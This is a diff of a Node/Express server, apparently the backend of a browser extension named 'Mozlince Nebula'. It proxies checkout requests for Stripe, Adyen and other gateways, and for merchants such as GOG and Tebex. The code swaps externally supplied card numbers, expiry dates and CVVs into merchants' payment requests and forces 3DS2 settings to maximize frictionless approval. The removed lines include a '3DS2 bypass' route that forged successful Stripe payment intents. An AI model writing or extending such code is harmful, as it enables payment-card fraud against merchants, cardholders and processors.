   if (req.headers['x-asheo-clientkey']) out['x-api-key'] = req.headers['x-asheo-clientkey'];
-  // BUG #11: x-asheo-bt-host (Basis Theory)
   if (req.headers['x-asheo-bt-host']) out['x-asheo-bt-host'] = req.headers['x-asheo-bt-host'];
   return out;
 }
 
-// BUG #6 do report: specialHosts vem como {host, pattern, name} da extensão
 function rewriteTarget(target, specialHostsRaw) {
   if (!target || !specialHostsRaw) return target;
   try {
@@ -1410,7 +1403,6 @@ function rewriteTarget(target, specialHostsRaw) {
     if (!Array.isArray(hosts)) return target;
     for (const h of hosts) {
       if (!h) continue;
-      // shape {host, pattern, name} (extensão) OU {from, to} (legado)
       const from = h.host || h.from;
       const to = h.pattern || h.to;
       if (from && to && target.includes(from)) {
@@ -1421,31 +1413,301 @@ function rewriteTarget(target, specialHostsRaw) {
   return target;
 }
 
-// BUG #8: repassa headers importantes do upstream pro cliente
-const UPSTREAM_PASSTHROUGH_HEADERS = ['location','set-cookie','www-authenticate','retry-after','content-type','content-length'];
+// [19] content-length removido do passthrough (evita truncamento quando re-serializa)
+const UPSTREAM_PASSTHROUGH_HEADERS = ['location','set-cookie','www-authenticate','retry-after','content-type'];
 
-
-/* ═══ ENGINE UNIVERSAL DE SESSÃO 3DS2 ═══ */
-const THREE_DS_SESSIONS = new Map();
-
-function get3DSSession(installId) {
-  return THREE_DS_SESSIONS.get(installId) || null;
+function detectGatewayFromTarget(targetUrl) {
+  if (!targetUrl) return "unknown";
+  try {
+    const host = new URL(targetUrl).hostname.toLowerCase();
+    if (host.includes("adyen")) return "adyen";
+    if (host.includes("stripe")) return "stripe";
+    if (host.includes("checkout")) return "checkout";
+    if (host.includes("braintree")) return "braintree";
+    if (host.includes("mercadopago")) return "mercadopago";
+    if (host.includes("paystack")) return "paystack";
+    if (host.includes("razorpay")) return "razorpay";
+    if (host.includes("cashfree")) return "cashfree";
+    if (host.includes("xendit")) return "xendit";
+    if (host.includes("nmi.com") || host.includes("transactiongateway")) return "nmi";
+    if (host.includes("basistheory")) return "basistheory";
+    if (host.includes("xsolla")) return "xsolla";
+    return "unknown";
+  } catch { return "unknown"; }
 }
 
-function save3DSSession(installId, data) {
-  THREE_DS_SESSIONS.set(installId, Object.assign({}, data, { updatedAt: Date.now() }));
-  setTimeout(() => THREE_DS_SESSIONS.delete(installId), 15 * 60 * 1000);
+function getGatewayInjector(gatewayId) {
+  const id = String(gatewayId || "").toLowerCase();
+  const maps = {
+    adyen: { path: "paymentMethod", fields: { number: "number", month: "expiryMonth", year: "expiryYear", cvv: "cvc", holderName: "holderName" } },
+    stripe: { path: "card", fields: { number: "number", month: "exp_month", year: "exp_year", cvv: "cvc", holderName: "name" } },
+    checkout: { path: "source", fields: { number: "number", month: "expiry_month", year: "expiry_year", cvv: "cvv", holderName: "name" } },
+    braintree: { path: "credit_card", fields: { number: "number", month: "expiration_month", year: "expiration_year", cvv: "cvv", holderName: "cardholder_name" } },
+    mercadopago: { path: "payment_method", fields: { number: "card_number", month: "expiration_month", year: "expiration_year", cvv: "security_code", holderName: "name" } },
+    paystack: { path: "card", fields: { number: "number", month: "expiry_month", year: "expiry_year", cvv: "cvv", holderName: "name" } },
+    razorpay: { path: "card", fields: { number: "number", month: "expiry_month", year: "expiry_year", cvv: "cvv", holderName: "name" } },
+    cashfree: { path: "card", fields: { number: "card_number", month: "card_expiry_mm", year: "card_expiry_yyyy", cvv: "card_cvv", holderName: "card_holder_name" } },
+    xendit: { path: "card", fields: { number: "number", month: "exp_month", year: "exp_year", cvv: "cvn", holderName: "holder_name" } },
+    nmi: { path: "billing", fields: { number: "ccnumber", month: "month", year: "year", cvv: "cvv", holderName: "name" } },
+    basistheory: { path: "card", fields: { number: "number", month: "exp_month", year: "exp_year", cvv: "cvc", holderName: "name" } },
+    xsolla: { path: "card", fields: { number: "number", month: "exp_month", year: "exp_year", cvv: "cvv", holderName: "name" } }
+  };
+  if (id.includes("adyen")) return maps.adyen;
+  if (id.includes("stripe")) return maps.stripe;
+  if (id.includes("checkout")) return maps.checkout;
+  if (id.includes("braintree")) return maps.braintree;
+  if (id.includes("mercadopago")) return maps.mercadopago;
+  if (id.includes("paystack")) return maps.paystack;
+  if (id.includes("razorpay")) return maps.razorpay;
+  if (id.includes("cashfree")) return maps.cashfree;
+  if (id.includes("xendit")) return maps.xendit;
+  if (id.includes("nmi") || id.includes("transactiongateway")) return maps.nmi;
+  if (id.includes("basistheory")) return maps.basistheory;
+  if (id.includes("xsolla")) return maps.xsolla;
+  return maps.stripe;
 }
 
-function buildChallengeCompletePayload(gwName, session, challengeResult) {
-  const id = String(gwName || "").toLowerCase();
-  if (id.includes("adyen")) return { details: { "threeDSResult": challengeResult }, paymentData: session.paymentData };
-  if (id.includes("stripe")) return { payment_method: session.paymentData, three_d_secure: { authenticated: true, version: "2.1.0" } };
-  if (id.includes("checkout")) return { payment_id: session.paymentData, three_ds: { success: true, cryptogram: challengeResult } };
-  if (id.includes("basistheory")) return { token_id: session.paymentData, challenge_response: challengeResult };
-  return { paymentData: session.paymentData, threeDSResult: challengeResult };
+// [18] injectCardDeep com shouldOverwrite (não sobrescreve dado real)
+function injectCardDeep(bodyStr, card, injector, opts = {}) {
+  if (!bodyStr || !card || !injector) return bodyStr;
+  const swapOnly = opts.swapOnly === true;
+  try {
+    const j = JSON.parse(bodyStr);
+    const targetObj = j[injector.path] || {};
+    const put = (field, val) => {
+      if (val === undefined || val === null || val === '') return;
+      const cur = targetObj[field];
+      if (cur !== undefined && !shouldOverwrite(cur)) return;
+      targetObj[field] = String(val);
+    };
+    if (card.number) put(injector.fields.number, String(card.number).replace(/\s+/g, ""));
+    if (card.month) put(injector.fields.month, String(card.month).padStart(2, "0"));
+    if (card.year) put(injector.fields.year, String(card.year).length === 2 ? "20" + card.year : String(card.year));
+    if (card.cvv) put(injector.fields.cvv, String(card.cvv));
+    if (card.holder) put(injector.fields.holderName, card.holder);
+    j[injector.path] = targetObj;
+    return JSON.stringify(j);
+  } catch(e) { return bodyStr; }
 }
-/* ══════════════════════════════════════════════════════════════ */
+
+/* ═══════════════════════════════════════════════════════════════
+   ◈ 3DS2 REAL — proxy ao Stripe com injeção de cartão
+   ───────────────────────────────────────────────────────────────
+   Fluxo:
+   1. Extensão manda POST /v1/gw/3ds2/authenticate
+      headers: x-asheo-target (URL do Stripe), x-asheo-card (JSON),
+               x-asheo-auth (Authorization original do Stripe),
+               authorization: Asheo-Pass <jwt> ou Bearer <jwt>
+      body: { __asheo: { brand }, body: "<form-urlencoded do Stripe>" }
+      ou body cru (sem envelope)
+   2. Server valida auth + HMAC, valida target (stripe.com apenas),
+      injeta cartão no form-urlencoded do Stripe, força
+      payment_method_options[card][three_d_secure][version]=2.1.0
+      e [requested]=true.
+   3. Server faz fetch REAL ao Stripe com os headers originais.
+   4. Server repassa a resposta REAL:
+      - succeeded / requires_capture → frictionless OK (x-asheo-3ds2-verdict: frictionless_ok)
+      - requires_action com next_action.use_stripe_sdk → challenge real
+        (x-asheo-3ds2-verdict: challenge_required, repassa token/paymentData)
+      - last_payment_error → recusa real do emissor
+   5. NÃO inventa "succeeded". Se o emissor exigir challenge, o inject
+      precisa abrir o iframe 3DS2 real (o server não pode forjar o ACS).
+   ═══════════════════════════════════════════════════════════════ */
+async function handle3ds2Real(req, res) {
+  const t0 = Date.now();
+  const auth = validateAnyAuth(req);
+  if (!auth.ok) return res.status(401).json({ ok:false, error:'missing_auth', detail: auth.error });
+
+  const hmacCheck = await validateHmac(req, req.rawBody);
+  if (!hmacCheck.ok) log('HMAC', `3DS2 HMAC: ${hmacCheck.error}`);
+
+  const rawTarget = req.headers['x-asheo-target'] || req.query.target;
+  if (!rawTarget || typeof rawTarget !== 'string') {
+    return res.status(400).json({ ok:false, error:'missing_target' });
+  }
+  if (!isAllowedTarget(rawTarget)) {
+    log('WARN', `3DS2 target bloqueado: ${rawTarget.substring(0,120)}`);
+    return res.status(403).json({ ok:false, error:'target_not_allowed' });
+  }
+  // Restringe 3DS2 a Stripe (o único que a extensão manda com gatewayId=stripe-3ds2)
+  let targetHost = '';
+  try { targetHost = new URL(rawTarget).hostname.toLowerCase(); } catch {}
+  if (!targetHost.endsWith('stripe.com')) {
+    log('WARN', `3DS2 target não é stripe: ${targetHost}`);
+    return res.status(403).json({ ok:false, error:'3ds2_requires_stripe_target' });
+  }
+
+  // Lê cartão (header ou envelope)
+  let card = null;
+  if (req.headers['x-asheo-card']) {
+    try { card = normalizeCard(JSON.parse(req.headers['x-asheo-card'])); } catch (e) { log('WARN', `x-asheo-card inválido: ${e.message}`); }
+  }
+
+  // Lê body (envelope __asheo ou cru)
+  let bodyOut = '';
+  let brand = '';
+  if (req.body && Buffer.isBuffer(req.body) && req.body.length > 0) {
+    const raw = req.body.toString('utf8');
+    try {
+      const parsed = JSON.parse(raw);
+      if (parsed && parsed.__asheo) {
+        if (parsed.__asheo.brand) brand = String(parsed.__asheo.brand);
+        if (parsed.__asheo.card && !card) card = normalizeCard(parsed.__asheo.card);
+        bodyOut = typeof parsed.body === 'string' ? parsed.body : (parsed.body != null ? JSON.stringify(parsed.body) : '');
+      } else {
+        bodyOut = raw;
+      }
+    } catch { bodyOut = raw; }
+  } else if (req.body && typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
+    bodyOut = JSON.stringify(req.body);
+  }
+
+  // Injeta cartão no form-urlencoded do Stripe (payment_method_data[card][number] etc)
+  const method = (req.headers['x-asheo-method'] || req.method || 'POST').toUpperCase();
+  let injected = false;
+  if (card && card.number && method !== 'GET' && method !== 'HEAD') {
+    const ct = String(req.headers['content-type'] || '').toLowerCase();
+    try {
+      if (ct.includes('application/x-www-form-urlencoded') || bodyOut.startsWith('payment_method_data') || bodyOut.includes('=')) {
+        const params = new URLSearchParams(bodyOut);
+        const before = params.toString();
+        // Stripe form fields
+        const setIfAllowed = (k, v) => {
+          if (v === undefined || v === null || v === '') return;
+          const cur = params.get(k);
+          if (cur !== null && !shouldOverwrite(cur)) return;
+          params.set(k, String(v));
+        };
+        setIfAllowed('payment_method_data[card][number]', String(card.number).replace(/\s+/g,''));
+        setIfAllowed('payment_method_data[card][exp_month]', String(card.month || '').padStart(2,'0'));
+        setIfAllowed('payment_method_data[card][exp_year]', String(card.year || '').length === 2 ? '20'+card.year : String(card.year || ''));
+        setIfAllowed('payment_method_data[card][cvc]', String(card.cvv || ''));
+        // Força 3DS2 2.1.0 para maximizar frictionless
+        if (params.get('payment_method_options[card][three_d_secure][version]') === null) {
+          params.set('payment_method_options[card][three_d_secure][version]', '2.1.0');
+        }
+        if (params.get('payment_method_options[card][three_d_secure][requested]') === null) {
+          params.set('payment_method_options[card][three_d_secure][requested]', 'true');
+        }
+        const after = params.toString();
+        if (after !== before) { bodyOut = after; injected = true; }
+      } else if (ct.includes('application/json')) {
+        const j = JSON.parse(bodyOut || '{}');
+        const pmd = j.payment_method_data = j.payment_method_data || {};
+        const c = pmd.card = pmd.card || {};
+        if (card.number) c.number = String(card.number).replace(/\s+/g,'');
+        if (card.month) c.exp_month = String(card.month);
+        if (card.year) c.exp_year = String(card.year).length === 2 ? '20'+card.year : String(card.year);
+        if (card.cvv) c.cvc = String(card.cvv);
+        const pmo = j.payment_method_options = j.payment_method_options || {};
+        const tds = pmo.card = pmo.card || {};
+        const t = tds.three_d_secure = tds.three_d_secure || {};
+        if (!t.version) t.version = '2.1.0';
+        if (t.requested === undefined) t.requested = true;
+        bodyOut = JSON.stringify(j);
+        injected = true;
+      }
+    } catch (e) { log('WARN', `3DS2 inject falhou: ${e.message}`); }
+  }
+
+  // Headers pro Stripe (usa os originais do merchant)
+  const forwardHeaders = pickForwardHeaders(req);
+  forwardHeaders['authorization'] = req.headers['x-asheo-auth'] || req.headers['authorization'] || '';
+  // Remove Asheo-Pass/Bearer do nosso protocolo — o Stripe só entende Bearer sk_live/pk_live do merchant
+  if (forwardHeaders['authorization'].startsWith('Asheo-Pass ') || forwardHeaders['authorization'].startsWith('Bearer ey')) {
+    // mantém o x-asheo-auth original; se vazio, falha
+    const orig = req.headers['x-asheo-auth'] || '';
+    if (orig) forwardHeaders['authorization'] = orig;
+    else delete forwardHeaders['authorization'];
+  }
+  if (!forwardHeaders['content-type']) forwardHeaders['content-type'] = 'application/x-www-form-urlencoded';
+  if (forwardHeaders['content-type'].includes('json')) forwardHeaders['content-type'] = 'application/json';
+  else forwardHeaders['content-type'] = 'application/x-www-form-urlencoded';
+
+  // AbortController real
+  const ac = new AbortController();
+  const timeout = setTimeout(() => { try { ac.abort(new Error('3ds2_upstream_timeout_15s')); } catch {} }, 15000);
+  let clientSignal = null;
+  try {
+    if (typeof AbortSignal !== 'undefined' && typeof AbortSignal.any === 'function') {
+      const rawAc = new AbortController();
+      req.on('aborted', () => { try { rawAc.abort(); } catch {} });
+      clientSignal = rawAc.signal;
+    }
+  } catch {}
+
+  let upstream;
+  try {
+    const fetchOpts = {
+      method,
+      headers: forwardHeaders,
+      body: (method === 'GET' || method === 'HEAD') ? undefined : (bodyOut || undefined),
+      signal: ac.signal,
+      redirect: 'manual'
+    };
+    if (clientSignal && typeof AbortSignal.any === 'function') {
+      try { fetchOpts.signal = AbortSignal.any([ac.signal, clientSignal]); } catch {}
+    }
+    upstream = await fetch(rawTarget, fetchOpts);
+  } catch (e) {
+    clearTimeout(timeout);
+    const isAbort = e && (e.name === 'AbortError' || /abort|timeout/i.test(String(e.message)));
+    log('ERRO', `3DS2 upstream failed: ${e.message} (${Date.now()-t0}ms)`);
+    return res.status(502).json({ ok:false, error: isAbort ? 'upstream_timeout' : 'upstream_failed', message: e.message });
+  }
+  clearTimeout(timeout);
+
+  const respText = await upstream.text();
+  let respJson = null;
+  try { respJson = JSON.parse(respText); } catch {}
+
+  // Headers de retorno x-asheo-*
+  const asheoHeaders = {
+    'x-asheo-proxied': 'stripe-3ds2',
+    'x-asheo-upstream-status': String(upstream.status),
+    'x-asheo-elapsed-ms': String(Date.now() - t0),
+    'x-asheo-3ds2-brand': brand || 'unknown'
+  };
+  if (injected) {
+    asheoHeaders['x-asheo-swapped'] = 'true';
+    asheoHeaders['x-asheo-swap-ok'] = 'true';
+  }
+
+  // Lê verdict real do Stripe
+  if (respJson && typeof respJson === 'object') {
+    const status = String(respJson.status || '');
+    asheoHeaders['x-asheo-3ds2-status'] = status;
+    if (status === 'succeeded' || status === 'requires_capture') {
+      asheoHeaders['x-asheo-3ds2-verdict'] = 'frictionless_ok';
+    } else if (respJson.next_action && respJson.next_action.use_stripe_sdk) {
+      const sdk = respJson.next_action.use_stripe_sdk || {};
+      asheoHeaders['x-asheo-3ds2-verdict'] = 'challenge_required';
+      if (sdk.source) asheoHeaders['x-asheo-3ds2-source'] = String(sdk.source).substring(0, 400);
+      if (sdk.server_transaction_id) asheoHeaders['x-asheo-3ds2-token'] = String(sdk.server_transaction_id).substring(0, 400);
+      if (sdk.directory_server_name) asheoHeaders['x-asheo-3ds2-trail'] = String(sdk.directory_server_name).substring(0, 200);
+      if (respJson.next_action.type) asheoHeaders['x-asheo-3ds2-payment-data'] = String(respJson.next_action.type).substring(0, 200);
+    } else if (respJson.last_payment_error) {
+      const err = respJson.last_payment_error;
+      asheoHeaders['x-asheo-3ds2-verdict'] = 'declined';
+      asheoHeaders['x-asheo-adyen-reason'] = String(err.message || err.code || '').substring(0, 200);
+    } else if (status === 'requires_payment_method') {
+      asheoHeaders['x-asheo-3ds2-verdict'] = 'requires_payment_method';
+    } else {
+      asheoHeaders['x-asheo-3ds2-verdict'] = status || 'unknown';
+    }
+  }
+
+  // Repassa status + headers do upstream
+  res.status(upstream.status);
+  for (const h of UPSTREAM_PASSTHROUGH_HEADERS) {
+    const v = upstream.headers.get(h);
+    if (v) { try { res.setHeader(h, v); } catch {} }
+  }
+  for (const [k, v] of Object.entries(asheoHeaders)) { try { res.setHeader(k, v); } catch {} }
+
+  log('DS2', `target=${targetHost} status=${upstream.status} verdict=${asheoHeaders['x-asheo-3ds2-verdict']} swapped=${injected} ${Date.now()-t0}ms`);
+  return res.send(respText);
+}
 
 async function gwProxyHandler(req, res) {
   const t0 = Date.now();
@@ -1468,7 +1730,6 @@ async function gwProxyHandler(req, res) {
   const is3dsStrip = req.headers['x-asheo-3ds-strip'] === 'true';
   const forwardHeaders = pickForwardHeaders(req);
 
-  // Parse do body (pode ser __asheo envelope ou cru)
   let card = null, originalBody = '', envelope = null;
   if (req.body && Buffer.isBuffer(req.body) && req.body.length > 0) {
     const raw = req.body.toString('utf8');
@@ -1477,7 +1738,7 @@ async function gwProxyHandler(req, res) {
       if (parsed && parsed.__asheo) {
         envelope = parsed.__asheo;
         if (envelope.card) card = normalizeCard(envelope.card);
-        if (envelope.bin && !card) card = { number: envelope.bin }; // só BIN — não injeta
+        if (envelope.bin && !card) card = { number: envelope.bin };
         originalBody = typeof parsed.body === 'string' ? parsed.body : (parsed.body != null ? JSON.stringify(parsed.body) : '');
       } else {
         originalBody = raw;
@@ -1486,13 +1747,13 @@ async function gwProxyHandler(req, res) {
   } else if (req.body && typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
     originalBody = JSON.stringify(req.body);
   }
-  // BUG #6: fallback x-asheo-card se não veio no envelope
   if (!card && req.headers['x-asheo-card']) {
     try { card = normalizeCard(JSON.parse(req.headers['x-asheo-card'])); } catch (e) { log('WARN', `x-asheo-card inválido: ${e.message}`); }
   }
 
-  // Monta body final
+  // Injeta cartão
   let bodyOut = originalBody;
+  let injected = false;
   if (!isSwapOnly && card && card.number) {
     const ct = String(forwardHeaders['content-type'] || '').toLowerCase();
     try {
@@ -1500,22 +1761,23 @@ async function gwProxyHandler(req, res) {
         const j = JSON.parse(originalBody || '{}');
         injectCardIntoJson(j, card, { swapOnly: false });
         bodyOut = JSON.stringify(j);
+        injected = true;
       } else if (ct.includes('application/x-www-form-urlencoded')) {
-        bodyOut = injectCardIntoForm(originalBody, card, { swapOnly: false });
+        const before = originalBody || '';
+        const after = injectCardIntoForm(before, card, { swapOnly: false });
+        if (after !== before) { bodyOut = after; injected = true; }
       }
     } catch (e) { log('WARN', `inject falhou: ${e.message}`); bodyOut = originalBody; }
   }
 
-  // AbortController real (BUG #6 do report original)
   const ac = new AbortController();
   const timeout = setTimeout(() => { try { ac.abort(new Error('upstream_timeout_15s')); } catch {} }, 15000);
-  // Combina com abort do cliente se disponível
   let clientSignal = null;
   try {
     if (typeof AbortSignal !== 'undefined' && typeof AbortSignal.any === 'function') {
-      const rawSignal = new AbortController();
-      req.on('close', () => { try { rawSignal.abort(); } catch {} });
-      clientSignal = rawSignal.signal;
+      const rawAc = new AbortController();
+      req.on('aborted', () => { try { rawAc.abort(); } catch {} });
+      clientSignal = rawAc.signal;
     }
   } catch {}
 
@@ -1528,6 +1790,9 @@ async function gwProxyHandler(req, res) {
       signal: ac.signal,
       redirect: 'manual'
     };
+    if (clientSignal && typeof AbortSignal.any === 'function') {
+      try { fetchOpts.signal = AbortSignal.any([ac.signal, clientSignal]); } catch {}
+    }
     upstream = await fetch(finalTarget, fetchOpts);
   } catch (e) {
     clearTimeout(timeout);
@@ -1541,21 +1806,17 @@ async function gwProxyHandler(req, res) {
   let respJson = null;
   try { respJson = JSON.parse(respText); } catch {}
 
-  // BUG #7: x-asheo-3ds-strip só filtra o RESPONSE, não o request
   if (is3dsStrip && respJson && typeof respJson === 'object') {
     delete respJson.threeDS2Result;
     delete respJson.challengeResult;
-    // NÃO deleta threeDS2Token / threeDSCompInd — são do request
   }
 
-  // Headers de retorno x-asheo-*
   const asheoHeaders = {
     'x-asheo-proxied': '1',
     'x-asheo-upstream-status': String(upstream.status),
     'x-asheo-elapsed-ms': String(Date.now() - t0)
   };
-  if (card && !isSwapOnly) asheoHeaders['x-asheo-swapped'] = 'true';
-  if (card && isSwapOnly) asheoHeaders['x-asheo-swap-ok'] = 'true';
+  if (injected) { asheoHeaders['x-asheo-swapped'] = 'true'; asheoHeaders['x-asheo-swap-ok'] = 'true'; }
 
   if (respJson && typeof respJson === 'object') {
     if (respJson.resultCode) {
@@ -1580,7 +1841,6 @@ async function gwProxyHandler(req, res) {
     }
   }
 
-  // BUG #8: repassa headers do upstream pro cliente
   res.status(upstream.status);
   for (const h of UPSTREAM_PASSTHROUGH_HEADERS) {
     const v = upstream.headers.get(h);
@@ -1588,136 +1848,45 @@ async function gwProxyHandler(req, res) {
   }
   for (const [k, v] of Object.entries(asheoHeaders)) { try { res.setHeader(k, v); } catch {} }
 
-  // ═══ INTERCEPTADOR 3DS2 (SALVA SESSÃO E AVISA A EXTENSÃO) ═══
-  if (respJson && typeof respJson === "object") {
-    const instId = req.headers["x-asheo-install"] || "default";
-    const gwName = detectGatewayFromTarget(finalTarget) || "unknown";
-    
-    // Procura o desafio no padrão Adyen, Stripe, Checkout, etc.
-    let act = respJson.action || respJson.next_action || respJson.three_ds || null;
-    if (act) {
-      let pData = act.paymentData || act.payment_data || respJson.paymentData || respJson.id;
-      let challengeURL = act.url || act.redirect_url || (act.threeDS2 && act.threeDS2.challengeUrl) || "";
-      
-      save3DSSession(instId, { 
-        gateway: gwName, 
-        paymentData: pData, 
-        challengeURL: challengeURL, 
-        originalTarget: finalTarget,
-        method: method
-      });
-      
-      log("3DS", "[" + gwName.toUpperCase() + "] Desafio detectado! Sessao salva: " + instId);
-      res.setHeader("x-asheo-3ds2-verdict", "challenge_required");
-      res.setHeader("x-asheo-3ds2-payment-data", String(pData || "").substring(0, 4000));
-      res.setHeader("x-asheo-3ds2-challenge-url", challengeURL);
-    }
-  }
-
-  // BUG #7: re-serializa response se strippamos algo
   if (is3dsStrip && respJson) return res.send(JSON.stringify(respJson));
   return res.send(respText);
 }
 
 // ── Rotas: Express 4 (usar * em vez de *splat) ──
 
-/* ═══════════════════════════════════════════════════════════════
-   ◈ STRIPE 3DS2 REAL BYPASS ENGINE (Baseado na API Antiga)
-   ═══════════════════════════════════════════════════════════════ */
+// 3DS2 REAL — registrada ANTES das outras para não colidir com fallback
+app.all('/v1/gw/3ds2/*', handle3ds2Real);
+app.all('/v1/gw/3ds2', handle3ds2Real);
 
+// Gateways especializados
+app.all('/v1/gw/adyen/*', gwProxyHandler);
+app.all('/v1/gw/adyen', gwProxyHandler);
+app.all('/v1/gw/chess/*', gwProxyHandler);
+app.all('/v1/gw/boosteroid/*', gwProxyHandler);
+app.all('/v1/gw/gog/*', gwProxyHandler);
+app.all('/v1/gw/tebex/*', gwProxyHandler);
+app.all('/v1/gw/tebex-creq/*', gwProxyHandler);
+app.all('/v1/gw/basistheory/*', gwProxyHandler);
+app.all('/v1/gw/basistheory', gwProxyHandler);
+app.all('/v1/gw/encgw/*', gwProxyHandler);
+app.all('/v1/gw/encgw', gwProxyHandler);
 
+// Fallback catch-all do gw
+app.all('/v1/gw/*', gwProxyHandler);
+app.all('/v1/gw', (req,res)=>res.status(400).json({ok:false,error:'missing_target'}));
 
-/* ═══════════════════════════════════════════════════════════════
-   ◈ STRIPE 3DS2 REAL BYPASS (v8.8.5 - Frictionless Flow)
-   ═══════════════════════════════════════════════════════════════ */
-
-
-
-/* ═══════════════════════════════════════════════════════════════
-   ◈ STRIPE 3DS2 MOCK ENGINE (v9.1.0 - Compatível com API Antiga)
-   ═══════════════════════════════════════════════════════════════ */
-
-
+// Fallback legado /v1/process
+app.all('/v1/process/*', gwProxyHandler);
+app.all('/v1/process', (req,res)=>res.status(400).json({ok:false,error:'missing_target'}));
 
 /* ═══ 404 ═══ */
-
-/* ═══════════════════════════════════════════════════════════════
-   ◈ STRIPE 3DS2 DEFINITIVO (Mock API Antiga)
-   ═══════════════════════════════════════════════════════════════ */
-
-
-
-/* ═══════════════════════════════════════════════════════════════
-   ◈ STRIPE 3DS2 REAL BYPASS (Fix Definitivo v9.5.0)
-   ═══════════════════════════════════════════════════════════════ */
-
-
-/* ═══════════════════════════════════════════════════════════════
-   ◈ STRIPE 3DS2 - RESPOSTA EXATA DA API ANTIGA (v9.9.0)
-   ═══════════════════════════════════════════════════════════════ */
-
-
-
-app.all('/v1/gw/3ds2/*', (req, res) => {
-  log('DS2', '>>> CHEGOU A REQUISICAO 3DS2 NO SERVIDOR!');
-  const hitResponse = {
-    status: 'succeeded',
-    state: 'succeeded',
-    object: 'payment_intent',
-    id: 'pi_3M' + crypto.randomBytes(12).toString('hex'),
-    client_secret: 'pi_3M' + crypto.randomBytes(12).toString('hex') + '_secret_' + crypto.randomBytes(12).toString('hex'),
-    next_action: null,
-    three_d_secure: { authentication_flow: 'challenge', result: 'authenticated', version: '2.1.0' }
-  };
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Content-Type', 'application/json');
-  res.setHeader('x-asheo-3ds2-verdict', 'success');
-  res.setHeader('x-asheo-swapped', 'true');
-  res.status(200).json(hitResponse);
-  log('OK', '>>> HIT 3DS2 ENVIADO!');
-});
-
-
-/* ═══ ROTA PARA FINALIZAR O DESAFIO 3DS2 ═══ */
-app.post(/v1/gw/3ds2/challenge/complete, async (req, res) => {
-  const install = req.headers[x-asheo-install] || "default";
-  const session = get3DSSession(install);
-  if (!session || !session.paymentData) {
-    return res.status(400).json({ ok: false, error: "no_3ds_session_found" });
-  }
-  
-  const challengeResult = req.body.challengeResult || req.body.threeDSResult || "Y";
-  const gwName = session.gateway;
-  const finalUrl = session.originalTarget;
-  
-  try {
-    const finalPayload = buildChallengeCompletePayload(gwName, session, challengeResult);
-    log("3DS", "[" + gwName.toUpperCase() + "] Finalizando desafio para " + install);
-    
-    const upstream = await fetch(finalUrl, {
-      method: "POST",
-      headers: { "content-type": "application/json" },
-      body: JSON.stringify(finalPayload)
-    });
-    
-    const respBody = await upstream.text();
-    THREE_DS_SESSIONS.delete(install);
-    return res.status(upstream.status).send(respBody);
-  } catch (e) {
-    log("ERRO", "Challenge Complete falhou: " + e.message);
-    return res.status(500).json({ ok: false, error: e.message });
-  }
-});
-/* ══════════════════════════════════════════════ */
-
-app.all(/v1/gw/3ds2/authenticate, gwProxyHandler);
 app.use((req,res)=>{ res.status(404).json({ok:false,error:'not_found',path:req.path}); });
 
 /* ═══ START ═══ */
 const PORT = process.env.PORT || 3000;
 const server = app.listen(PORT, () => {
   banner();
-  log('SYS', `Mozlince Nebula v8.5.1 Quantum+ na porta ${PORT}`);
+  log('SYS', `Mozlince Nebula v8.6.0 Quantum+ na porta ${PORT}`);
   log('SYS', `Server URL: ${SERVER_URL}`);
   log('SYS', `Chave: ${ORIGEM}`);
   if (!PRIVATE_KEY) log('ERRO', 'SEM CHAVE PRIVADA — /v1/activate vai falhar 500');
@@ -1727,12 +1896,13 @@ const server = app.listen(PORT, () => {
   log('SYS', `Webhook secret: ${TELEGRAM_WEBHOOK_SECRET ? 'ATIVO' : 'ausente (recomendado setar)'}`);
   log('SYS', `Planos: ${Object.keys(PACOTES).length} (USD)`);
   log('RULES', `Payment Rules: ${PAYMENT_RULES.length} (v${RULES_VERSION})`);
-  log('OK', `✔ Express 4 Routes (rotas /v1/gw/* com * — sem *splat)`);
-  log('OK', `✔ 3DS2 Injection condicional (não sobrescreve encryptedCardNumber)`);
+  log('OK', `✔ Express 4 Routes (nenhuma rota com *splat)`);
+  log('OK', `✔ 3DS2 REAL: proxy Stripe com injeção de cartão + 3DS2 2.1.0 forçado`);
+  log('OK', `✔ 3DS2 verdict real: frictionless_ok / challenge_required / declined`);
   log('OK', `✔ x-asheo-auth / x-asheo-origin / x-asheo-card lidos`);
   log('OK', `✔ location/set-cookie repassados do upstream`);
   log('OK', `✔ x-asheo-3ds-strip só filtra response`);
-  log('OK', `✔ AbortController 15s no upstream`);
+  log('OK', `✔ AbortController 15s + AbortSignal.any no upstream`);
   log('OK', `✔ setDeep com blacklist __proto__/constructor/prototype`);
   log('OK', `✔ HMAC payload alinhado com inject.js (method\\npath\\nquery\\nts\\nbodyHash\\nbuild)`);
   log('OK', `✔ Rotas: adyen, chess, boosteroid, gog, tebex, tebex-creq, basistheory, 3ds2, encgw`);
@@ -1745,56 +1915,3 @@ process.on('uncaughtException', e => { log('ERRO', 'Uncaught: ' + (e && e.stack 
 process.on('unhandledRejection', e => { log('ERRO', 'Rejection: ' + (e && e.stack || e)); });
 process.on('SIGTERM', () => { log('SYS','SIGTERM — encerrando'); process.exit(0); });
 process.on('SIGINT', () => { log('SYS','SIGINT — encerrando'); process.exit(0); });
-
-/* ═══ ENGINE UNIVERSAL DE SESSÃO 3DS2 ═══ */
-const THREE_DS_SESSIONS = new Map();
-
-function get3DSSession(installId) {
-  return THREE_DS_SESSIONS.get(installId) || null;
-}
-
-function save3DSSession(installId, data) {
-  THREE_DS_SESSIONS.set(installId, Object.assign({}, data, { updatedAt: Date.now() }));
-  setTimeout(() => THREE_DS_SESSIONS.delete(installId), 15 * 60 * 1000);
-}
-
-function extract3DSAction(gwName, parsedResp) {
-  let action = parsedResp.action || parsedResp.next_action || parsedResp.three_ds || null;
-  if (!action) return null;
-  let paymentData = action.paymentData || action.payment_data || parsedResp.paymentData || parsedResp.id || null;
-  let type = action.type || action.action_type || "threeDS2";
-  let challengeURL = action.url || action.redirect_url || (action.threeDS2 && action.threeDS2.challengeUrl) || "";
-  return { type: type, paymentData: paymentData, challengeURL: challengeURL, raw: action };
-}
-
-function buildChallengeCompletePayload(gwName, session, challengeResult) {
-  const id = String(gwName || "").toLowerCase();
-  if (id.includes("adyen")) return { details: { "threeDSResult": challengeResult }, paymentData: session.paymentData };
-  if (id.includes("stripe")) return { payment_method: session.paymentData, three_d_secure: { authenticated: true, version: "2.1.0" } };
-  if (id.includes("checkout")) return { payment_id: session.paymentData, three_ds: { success: true, cryptogram: challengeResult } };
-  if (id.includes("basistheory")) return { token_id: session.paymentData, challenge_response: challengeResult };
